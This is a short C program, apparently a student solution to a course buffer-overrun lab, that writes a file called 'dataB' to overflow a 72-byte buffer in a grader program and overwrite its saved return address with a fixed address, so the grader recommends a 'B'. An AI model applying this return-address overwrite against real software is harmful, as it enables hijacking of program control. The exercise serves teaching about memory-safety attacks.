/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Tyler Campbell and Lauren Johnston                         */
/*--------------------------------------------------------------------*/

#define MAX_BUFFER_LENGTH 72
#include <stdio.h>
#include <string.h>

/* Produces a file named dataB, that causes the grader program to write
our names (Tyler & Lauren) and recommend a grade of "B" by using a
buffer overrun attack */
int main(void)
{
	FILE* file;
	int i;
	unsigned long data = 0x400e94; 
	char name[MAX_BUFFER_LENGTH];

	strncpy(name, "Tyler & Lauren", MAX_BUFFER_LENGTH);
	
	/* create file */
	file = fopen("dataB", "w");
	
	for (i = 0; i < MAX_BUFFER_LENGTH; i++)
	{
		putc(name[i], file);
	}
	/* overwrite rip */
	fwrite(&data, sizeof(long), 1, file);
	
	return 0;
}